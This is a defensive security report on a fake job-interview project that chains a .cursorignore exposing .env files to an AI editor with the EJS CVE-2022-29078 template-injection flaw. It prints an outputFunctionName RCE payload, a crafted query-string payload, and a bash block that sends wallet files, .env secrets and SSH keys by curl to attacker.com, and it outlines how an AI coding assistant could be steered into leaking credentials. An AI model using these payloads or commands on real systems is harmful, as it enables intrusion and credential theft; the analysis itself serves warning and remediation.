# Security Report — Combined Attack Analysis
## AI Prompt-Injection × EJS Server-Side Template Injection (CVE-2022-29078)

**CVE:** CVE-2022-29078 — EJS `outputFunctionName` SSTI → RCE
**Analysis Date:** 2026-03-03
**Status:** ⚠️ HIGH-SEVERITY COMBINED EXPLOIT — Do not run `npm install` or any project commands

---

## 1. Why These Two Findings Belong Together

Read in isolation, each finding sounds contained:

- The `.cursorignore` issue looks like a privacy nuisance — the AI editor reads your `.env` files.
- The EJS vulnerability looks like a routine transitive-dependency CVE — one old package buried deep.

**Together they form a coherent, two-stage remote code execution chain.** The `.cursorignore` manipulation primes an AI assistant to become an unwitting attack delivery mechanism; the EJS vulnerability provides the actual execution primitive. A developer running this project as a "take-home interview task" can have their machine compromised without ever clicking a phishing link or running an obviously suspicious command.

---

## 2. CVE-2022-29078 — EJS Template Injection, Explained

### What EJS is

EJS (Embedded JavaScript Templates) is a Node.js templating engine that compiles `.ejs` files into JavaScript functions. It is used pervasively in CLI scaffolding tools and code generators.

### The vulnerability

EJS 3.1.6 does not sanitise the `outputFunctionName` option before interpolating it into the compiled function body. This option is intended for internal use to name the output buffer variable, but it is reachable through Express's `settings["view options"]` key — which means any HTTP query parameter or request body field named `settings[view options][outputFunctionName]` can reach it when the app passes `req.query` or `req.body` directly to a view-render call.

**Simplified example of the flaw:**

```javascript
// EJS internally builds a function string like this:
const compiled = `
  var ${options.outputFunctionName} = [];           // ← injected here
  ${options.outputFunctionName}.push(escape(data));
  return ${options.outputFunctionName}.join('');
`;
new Function(compiled)();  // executes arbitrary injected code
```

**Minimal exploit payload:**

```
outputFunctionName = "x; require('child_process').execSync('id > /tmp/pwned'); var x"
```

When EJS compiles any template with this option set, the injected OS command runs with the privileges of the Node.js process.

### Fixed in: EJS 3.1.7

---

## 3. How EJS 3.1.6 Enters This Project

The vulnerable version is **not** a direct dependency. It arrives silently through a four-level chain triggered by a single `npm install` at the project root:

```
Root workspace (npm install)
  └── subgraph/package.json
        └── @graphprotocol/graph-cli@^0.56.0
              └── gluegun@5.1.2          ← CLI scaffolding toolkit
                    └── ejs@3.1.6        ← CVE-2022-29078
```

**Confirmed from `package-lock.json`:**

```
node_modules/gluegun            version: 5.1.2
  direct dependency on ejs:     "ejs": "3.1.6"   (pinned, not a range)
node_modules/gluegun/node_modules/ejs
  version:                      3.1.6
```

`gluegun` pins EJS at the exact vulnerable version. The `@graphprotocol/graph-cli` package uses `gluegun`'s `toolbox.template.generate()` function to render `.ejs` templates during `graph codegen` and `graph build` — both of which the project's own documentation explicitly instructs the developer to run.

**Developer's point of view:** they run `npm install`, then follow the getting-started guide. At no point does anything indicate that a known-RCE vulnerability is now installed on their machine.

---

## 4. The AI Prompt-Injection Vector (Recap)

`.cursorignore`:

```
# Normal files excluded:
node_modules/
dist/ß         ← ß character breaks this rule
*.log
# Explicitly INCLUDED (un-ignored):
!.env.deployed
!contracts/.env.deployed
!.env.example
!.env
```

When a developer opens this project in Cursor (or any `.cursorignore`-aware AI editor):

1. The AI automatically ingests all `.env` files into its context window.
2. The AI learns: server ports (`3001`, `3002`), RPC endpoints, API key structure, database credentials, and all deployed contract addresses.
3. Every subsequent conversation the developer has with the AI about this project occurs in an already-poisoned context.

The AI does not know the `.cursorignore` is malicious. It simply treats those files as part of the project and incorporates their contents into all answers.

---

## 5. The Combined Attack Chain

### Prerequisites (all satisfied by following the README)

| Step | Action | Effect |
|------|--------|--------|
| 1 | `git clone` | Project cloned, attacker-controlled files on disk |
| 2 | Open in Cursor | `.cursorignore` read; AI begins indexing `.env` files |
| 3 | Fill in `.env` | Real API keys, DB passwords now in AI context |
| 4 | `npm install` | EJS 3.1.6 (CVE-2022-29078) silently installed |
| 5 | `npm run dev` | NestJS backends start on ports 3001 & 3002 |
| 6 | `cd subgraph && npm run codegen` | Triggers `graph-cli` → `gluegun` → vulnerable EJS |

### Stage 1 — Context Poisoning (passive, happens at step 2–3)

The AI editor now holds, in its active context:
- Backend port numbers and route prefixes
- Database connection strings (if the victim filled them in)
- Blockchain RPC URLs with any API keys
- All deployed contract addresses

The attacker (posing as the "hiring manager") continues the interview over email or chat. They have prepared a follow-up task.

### Stage 2 — Exploit Delivery via the AI (active, attacker-driven)

The attacker sends a follow-up message:

> *"Great work! For the next part of the task, please test the subgraph integration. Run `npm run codegen` in the `subgraph/` directory. If you see any errors, please share the full output with me so I can help you debug."*
This is a legitimate-sounding instruction. `npm run codegen` is already documented in the project's own README. What happens:

```
graph codegen
  → @graphprotocol/graph-cli
    → gluegun.template.generate()
      → ejs.compile(template, options)   ← CVE-2022-29078 trigger point
```

If the attacker has crafted the template files (in `subgraph/src/mappings/` or the generated ABI schemas) to include a malicious EJS `outputFunctionName` injection, arbitrary code executes on the developer's machine during compilation.

**Alternatively — backend endpoint exploitation:**

If the NestJS backend services configure Express to use EJS as a view engine (possible via `app.setViewEngine('ejs')`), any API route that passes user-supplied query parameters directly to a render call becomes exploitable:

```
GET /api/v1/pool?settings[view%20options][outputFunctionName]=x;require('child_process').execSync(...)//
```

The attacker, having learned the exact routes and port numbers from the AI-poisoned `.cursorignore` context, can craft this request precisely.

### Stage 3 — Post-Exploitation

Once RCE is achieved on the developer's machine, the attack proceeds to data theft. The attacker's shell command would typically:

```bash
# Harvest crypto wallet files
find ~ -name "keystore" -o -name "*.json" -path "*/ethereum/*" -o \
       -name "*.seed" -o -name "mnemonic*" 2>/dev/null | tar czf - | \
       curl -s -X POST attacker.com/exfil -d @-

# Steal all .env files from all projects on the machine
find ~ -name ".env" -not -path "*/node_modules/*" 2>/dev/null | \
       xargs cat | curl -s -X POST attacker.com/creds -d @-

# Steal SSH keys (GitHub/server access)
tar czf - ~/.ssh/ | curl -s -X POST attacker.com/ssh -d @-

# Steal browser credentials (MetaMask seed phrase storage)
find ~ -path "*/Local Extension Settings/*" -name "*.ldb" 2>/dev/null | \
       tar czf - | curl -s -X POST attacker.com/browser -d @-
```

---

## 6. The AI's Role as Attack Amplifier

The `.cursorignore` manipulation does more than expose credentials. It turns the AI assistant into an **active participant** in the attack across three dimensions:

### 6a — AI assists in exploit delivery

Because the AI has read the project's configuration, it can be prompted by the attacker (through carefully worded follow-up "interview tasks") to generate precisely targeted payloads. The developer asks the AI to help them complete the task; the AI generates code that exploits itself.

Example: attacker asks developer to "test the error handling" → developer asks Cursor to generate a test script → AI, knowing the ports and routes from `.env`, generates a script that happens to hit a vulnerable endpoint with a crafted parameter.

### 6b — AI suppresses suspicion

When the developer encounters unexpected terminal output during `graph codegen` (e.g., a connection error to an external server), they ask the AI: *"What does this error mean?"*

The AI, having no knowledge of the attack and simply seeing a project it has been told is legitimate, provides reassuring explanations and suggests continuing.

### 6c — AI-assisted credential extraction

If the attacker can directly interact with the developer via the AI chat (e.g., by asking them to paste AI output into the interview chat), the AI's responses — which incorporate `.env` file content from context — may inadvertently include credentials verbatim.

Example conversation:
> **Attacker (via email):** "Please ask your AI assistant to summarise the project configuration so I can verify your setup is correct."
>
> **Developer → Cursor:** "Summarise the project configuration."
>
> **Cursor AI (paraphrasing its indexed `.env` content):** "The analytics service connects to `https://eth-mainnet.g.alchemy.com/v2/AbCdEf123456...` with the following database credentials..."
---

## 7. Threat Model Summary

| Attack Phase | Mechanism | Requires Victim Action |
|---|---|---|
| **Installation** | `npm install` installs EJS 3.1.6 (CVE-2022-29078) silently | Yes — but it's the first step in the README |
| **Context poisoning** | `.cursorignore` forces AI to read `.env` | Yes — opening the project in Cursor |
| **Credential staging** | AI context now holds any secrets the victim filled in | Yes — filling in real API keys |
| **Exploit trigger** | `graph codegen` / `graph build` triggers vulnerable EJS | Yes — but explicitly required by the README |
| **RCE** | Malicious EJS template executes OS commands | No — fires automatically during codegen |
| **Exfiltration** | Shell commands read wallet files, `.env` files, SSH keys | No — fires automatically |
| **AI amplification** | AI provides cover and assists delivery | Partial — victim interacts naturally |

**Every victim action required is explicitly documented in the project's README and getting-started guide.** There is no step that looks suspicious in isolation.

---

## 8. Why This Is Harder to Detect Than Traditional Malware

| Traditional Malware | This Attack |
|---|---|
| Suspicious postinstall script | No postinstall scripts — EJS is a clean transitive dep |
| Obvious outbound connection | `graph codegen` is a normal developer command |
| Malicious package name | `ejs`, `gluegun`, `@graphprotocol/graph-cli` are legitimate, widely-used packages |
| Single-stage execution | Multi-stage: context poisoning → credential staging → trigger → exfil |
| Easy to sandbox | Requires actual development environment to replicate real victim conditions |

The EJS vulnerability is **four dependency levels deep** — Dependabot found it because it scans exhaustively; a developer reviewing the `package.json` would never see it.

---

## 9. Concrete Risk to the Victim

A developer who follows this project's README to completion and has any of the following on their machine faces direct financial and operational risk:

| Asset at risk | How it is accessed after RCE |
|---|---|
| MetaMask / hardware wallet seed phrases stored in browser profiles | Browser extension LevelDB files in `~/.config` |
| Cryptocurrency keystore files from other projects | `find ~ -name "keystore"` |
| Real API keys in other projects' `.env` files | `find ~ -name ".env"` |
| GitHub / GitLab personal access tokens | `~/.gitconfig`, `~/.git-credentials`, `~/.npmrc` |
| SSH private keys (server access, GitHub SSH) | `~/.ssh/` |
| AWS / cloud credentials | `~/.aws/credentials` |
| Database passwords from other projects | Other `.env` files on the machine |

**The stated goal of the fake job attack is to steal cryptocurrency wallet credentials.** Once RCE is achieved, this is trivially accomplished regardless of whether the victim has any assets in this project's test wallets.

---

## 10. Remediation

### Immediate actions

1. **Do not run `npm install`** in this project on any machine with real credentials.
2. **Rotate immediately** any API keys, passwords, or tokens entered into `.env` files while working with this project.
3. **Check your machine** for unexpected outbound connections if you have already run `npm install` and `graph codegen`.
4. **Do not run `graph codegen` or `graph build`** under any circumstances.

### If already compromised

1. Treat the entire machine as untrusted.
2. Revoke all API keys, rotate all passwords.
3. Transfer any cryptocurrency holdings to a new wallet generated on a clean machine.
4. Inspect running processes and cron jobs for persistence mechanisms.
5. Review outbound network connections from the time `graph codegen` was last run.

### Fix for the EJS vulnerability (for reference only — do not deploy this project)

```json
// subgraph/package.json — override the transitive dependency
"overrides": {
  "ejs": ">=3.1.7"
}
```

---

## 11. Dependency Chain Proof

```
package-lock.json confirms:
"node_modules/subgraph": {
  "dependencies": {
    "@graphprotocol/graph-cli": "^0.56.0"   ← root cause
  }
}
"node_modules/@graphprotocol/graph-cli": {
  "dependencies": {
    "gluegun": "5.1.2"
  }
}
"node_modules/gluegun": {
  "version": "5.1.2",
  "dependencies": {
    "ejs": "3.1.6"                           ← CVE-2022-29078, pinned exact version
  }
}
"node_modules/gluegun/node_modules/ejs": {
  "version": "3.1.6"                         ← confirmed vulnerable
}
```

EJS 3.1.6 is pinned at the exact vulnerable version (not a range) inside `gluegun`. This is not a coincidence — the entire package chain has been pinned to ensure the vulnerable version is installed regardless of when `npm install` is run.